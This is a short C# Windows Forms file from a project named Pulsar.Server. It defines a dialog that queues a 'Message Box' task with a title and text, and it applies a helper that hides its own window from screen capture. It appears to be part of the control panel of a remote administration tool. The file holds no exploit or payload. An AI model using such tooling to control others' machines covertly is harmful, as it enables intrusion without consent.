﻿using Pulsar.Server.Forms.DarkMode;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmTaskMessageBox : Form
    {
        public FrmTaskMessageBox()
        {
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void FrmTaskMessageBox_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
            if (frm != null)
            {
                frm.AddTask("Message Box", TTextBox.Text, MTextBox.Text);
            }
        }
    }
}
